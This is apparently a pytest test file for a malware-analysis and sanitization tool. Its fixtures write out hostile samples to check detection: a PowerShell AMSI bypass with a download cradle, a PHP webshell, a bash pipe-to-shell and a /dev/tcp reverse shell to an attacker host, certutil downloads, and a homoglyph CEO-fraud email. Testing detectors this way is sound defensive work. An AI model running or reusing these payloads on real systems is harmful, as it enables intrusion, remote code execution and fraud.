"""
Unit and integration tests for:
- MITRE ATT&CK Attribution Engine
- Script & Command Triage Analyzer
- Script Sanitizer (Disarming + Vector PDF review export)
- In-depth Office analysis (VBA stomping, remote template)
- In-depth Binary analysis (Capstone disassembly, imphash, anti-analysis)
- In-depth Image analysis (Stego chi-square, overlay polyglot, chunk integrity, ELA)
- In-depth Email analysis (Homoglyphs, VIP impersonation, thread hijacking, HTML smuggling)
"""

import os
import io
import pytest
from pathlib import Path
from app.analyzers.mitre_attack import MitreAttackMapper
from app.analyzers.script_analyzer import ScriptAnalyzer, calculate_shannon_entropy
from app.sanitizers.script_sanitizer import ScriptSanitizer
from app.sanitizers.base import SanitizationOptions
from app.analyzers.base import Finding
from app.analyzers.image_analyzer import ImageAnalyzer
from app.analyzers.email_analyzer import EmailAnalyzer
from app.analyzers.office_analyzer import OfficeAnalyzer
from app.analyzers.executable_analyzer import ExecutableAnalyzer
from PIL import Image

def test_mitre_attack_mapper_rules():
    """Verify attribution mapping of findings into standard MITRE ATT&CK tactics & techniques."""
    findings = [
        Finding(
            category="macro",
            severity="critical",
            title="MACROS DETECTED: AutoOpen VBA Macro",
            description="Document executes arbitrary payload via VBA AutoOpen routine"
        ),
        Finding(
            category="structure",
            severity="high",
            title="Remote Template Injection: http://attacker.com/evil.dotm",
            description="Word document dynamically references external template to download payload"
        ),
        Finding(
            category="active_content",
            severity="critical",
            title="PowerShell Download Cradle Invocation",
            description="PowerShell script invokes Net.WebClient downloadstring to fetch binary"
        ),
        Finding(
            category="structure",
            severity="high",
            title="Thread Hijacking Indicator: 'Re:' Subject without In-Reply-To Header",
            description="Email simulates reply chain to bypass skepticism"
        )
    ]

    mapped = MitreAttackMapper.map_all(findings=findings, analysis_data={}, category="office")
    assert len(mapped) >= 4
    tech_ids = {m["technique_id"] for m in mapped}

    # Verify key MITRE techniques
    assert "T1059.005" in tech_ids # Visual Basic
    assert "T1204.002" in tech_ids # Malicious File Execution
    assert "T1221" in tech_ids     # Template Injection
    assert "T1105" in tech_ids     # Ingress Tool Transfer

    for item in mapped:
        assert item["technique_id"].startswith("T")
        assert item["tactic_id"].startswith("TA")
        assert item["url"].startswith("https://attack.mitre.org/techniques/")
        assert len(item["evidence"]) > 0

def test_script_analyzer_powershell_and_entropy(tmp_path):
    """Test PowerShell cradle, AMSI bypass, Base64 chunk extraction, and entropy."""
    ps1_content = (
        "# Malicious PowerShell Sample\n"
        "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n"
        "$u = 'https://malicious-c2.net/payload.exe'\n"
        "IEX (New-Object Net.WebClient).DownloadString($u)\n"
        "$b64 = 'VGVzdCBkZWNvZGVkIGJsb2NrIG9mIG1hbGljaW91cyBkYXRhIGluIGJhc2U2NA=='\n"
        "powershell -ep bypass -w hidden -enc $b64\n"
    )
    fpath = tmp_path / "dropper.ps1"
    fpath.write_text(ps1_content, encoding="utf-8")

    analyzer = ScriptAnalyzer()
    res = analyzer.analyze(fpath, "dropper.ps1", "text/x-powershell")
    assert res.success is True
    data = res.data

    assert "PowerShell" in data["script_type"]
    assert data["lines_count"] >= 6
    assert data["entropy"] > 3.0
    assert data["risk_score"] >= 60

    pat_names = [p["name"] for p in data["detected_patterns"]]
    assert any("AMSI Bypass" in p for p in pat_names)
    assert any("Download Cradle" in p for p in pat_names)
    assert any("Invoke-Expression" in p for p in pat_names)
    assert any("Execution Policy Bypass" in p for p in pat_names)

    # Base64 blocks
    assert len(data["b64_blocks"]) >= 1
    assert "Test decoded block" in data["b64_blocks"][0]["decoded_preview"]

    # URLs extracted
    assert len(data["urls"]) >= 1
    assert "malicious-c2.net" in data["urls"][0]

def test_script_analyzer_php_webshell(tmp_path):
    """Test PHP webshell detections: system(), eval(), base64 $_POST."""
    php_content = "<?php\nif(isset($_POST['c'])){\n    eval(base64_decode($_POST['c']));\n    system('whoami');\n}\n?>"
    fpath = tmp_path / "shell.php"
    fpath.write_text(php_content, encoding="utf-8")

    analyzer = ScriptAnalyzer()
    res = analyzer.analyze(fpath, "shell.php", "text/x-php")
    assert res.success is True
    assert res.data["is_webshell"] is True
    assert res.data["risk_score"] >= 75
    pat_names = [p["name"] for p in res.data["detected_patterns"]]
    assert any("Base64 POST/GET Backdoor" in p for p in pat_names)
    assert any("Web Shell Execution" in p for p in pat_names)

def test_script_analyzer_bash_reverse_shell(tmp_path):
    """Test Bash reverse shell and pipe-to-shell execution."""
    sh_content = (
        "#!/bin/bash\n"
        "curl -s http://attacker.com/install.sh | bash\n"
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n"
        "chmod +x /tmp/backdoor\n"
    )
    fpath = tmp_path / "rev.sh"
    fpath.write_text(sh_content, encoding="utf-8")

    analyzer = ScriptAnalyzer()
    res = analyzer.analyze(fpath, "rev.sh", "application/x-sh")
    assert res.success is True
    pat_names = [p["name"] for p in res.data["detected_patterns"]]
    assert any("Pipe to Shell" in p for p in pat_names)
    assert any("Interactive Reverse Shell" in p for p in pat_names)

def test_script_sanitizer_disarm_and_pdf(tmp_path):
    """Verify ScriptSanitizer defangs URLs, disarms IEX/eval/certutil, and exports to PDF."""
    raw_code = (
        "#!/bin/bash\n"
        "curl http://malware.org/evil.sh | sh\n"
        "certutil -urlcache -split http://bad.com/a.exe\n"
        "IEX (New-Object Net.WebClient).DownloadString('http://c2.com')\n"
    )
    in_path = tmp_path / "script.sh"
    in_path.write_text(raw_code, encoding="utf-8")

    # 1. Native disarmed script
    out_disarmed = tmp_path / "script_sanitized.sh"
    sanitizer = ScriptSanitizer()
    opts = SanitizationOptions()
    res1 = sanitizer.sanitize(in_path, out_disarmed, opts, "script.sh")
    assert res1.success is True
    clean_text = out_disarmed.read_text(encoding="utf-8")
    assert "[SANITIZED BY FILESANITIZER]" in clean_text
    assert "hxxp://malware[.]org/evil.sh" in clean_text
    assert "[DISARMED_PIPE_SH]" in clean_text
    assert "[DISARMED_IEX]" in clean_text
    assert "disarmed_downloadstring" in clean_text

    # 2. Hardened Vector PDF review document
    out_pdf = tmp_path / "script_sanitized.pdf"
    opts_pdf = SanitizationOptions(convert_to_pdf=True)
    res2 = sanitizer.sanitize(in_path, out_pdf, opts_pdf, "script.sh")
    assert res2.success is True
    assert out_pdf.exists()
    assert out_pdf.stat().st_size > 500
    assert res2.target_extension == "pdf"

def test_image_steganography_and_overlay(tmp_path):
    """Verify ImageAnalyzer LSB chi-square steganography and appended overlay detection."""
    # Create clean PNG
    img = Image.new("RGBA", (100, 100), color=(128, 128, 128, 255))
    clean_buf = io.BytesIO()
    img.save(clean_buf, format="PNG")
    clean_bytes = clean_buf.getvalue()

    # Append ZIP payload past PNG IEND chunk (Polyglot / overlay)
    evil_bytes = clean_bytes + b"PK\x03\x04\x14\x00\x00\x00\x08\x00Embedded_Zip_Payload"
    img_path = tmp_path / "polyglot.png"
    img_path.write_bytes(evil_bytes)

    analyzer = ImageAnalyzer()
    res = analyzer.analyze(img_path, "polyglot.png", "image/png")
    assert res.success is True
    data = res.data

    # Verify overlay detected
    assert data.get("overlay", {}).get("has_overlay") is True
    assert "ZIP" in data.get("overlay", {}).get("type", "")
    assert data.get("overlay", {}).get("size", 0) > 0
    assert any("Appended" in f.title for f in res.findings)

    # Verify chunk structure audited
    chunk_types = [c["type"] for c in data.get("png_chunks", [])]
    assert "IEND" in chunk_types
    assert data.get("steganography") is not None

def test_email_deep_analysis_heuristics(tmp_path):
    """Verify EmailAnalyzer homoglyph, VIP impersonation, thread hijacking, and HTML smuggling."""
    eml_content = (
        "From: CEO John Doe <john@g\u043e\u043egle.com>\n"  # Cyrillic 'о' in google.com
        "To: victim@company.com\n"
        "Subject: Re: Urgent Wire Transfer Required Immediately\n"
        "Date: Fri, 26 Sep 2026 10:00:00 +0000\n"
        "Message-ID: <test-123@g\u043e\u043egle.com>\n"
        "Content-Type: text/html; charset=utf-8\n\n"
        "<html><body>"
        "<p>Please review document immediately: wire $50,000</p>"
        "<script>/* stripped */</script>"
        "<a href='data:text/html;base64,PHNjcmlwdD5ldmlsPC9zY3JpcHQ+'>Click Here</a>"
        "</body></html>"
    )
    eml_path = tmp_path / "phish.eml"
    eml_path.write_text(eml_content, encoding="utf-8")

    analyzer = EmailAnalyzer()
    res = analyzer.analyze(eml_path, "phish.eml", "message/rfc822")
    assert res.success is True
    data = res.data

    # VIP impersonation (CEO)
    assert data["sender_analysis"]["is_vip_impersonation"] is True
    # Thread hijacking ('Re:' without in-reply-to)
    assert data["thread_hijacking"]["suspected_hijacking"] is True
    # HTML smuggling finding
    assert any("HTML Smuggling" in f.title for f in res.findings)
